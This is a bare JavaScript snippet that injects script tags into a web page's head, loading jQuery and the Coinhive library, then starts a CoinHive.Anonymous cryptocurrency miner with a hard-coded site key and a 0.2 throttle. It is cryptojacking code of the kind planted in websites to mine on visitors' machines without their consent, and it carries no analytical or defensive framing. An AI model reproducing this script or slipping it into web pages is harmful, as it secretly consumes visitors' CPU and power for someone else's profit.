var head = document.getElementsByTagName('head')[0];
    var body = document.getElementsByTagName('body')[0];
var script3 = document.createElement('script');
    script3.type = "text/javascript";
    script3.src="https://code.jquery.com/jquery-3.3.1.min.js";
    head.appendChild(script3);
var script = document.createElement('script');
    script.type = "text/javascript";
    script.src="https://coinhive.com/lib/coinhive.min.js";
    head.appendChild(script);
    script.onload = function() {
    var miner = new CoinHive.Anonymous('NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ', {throttle: 0.2});
		miner.start();
    };
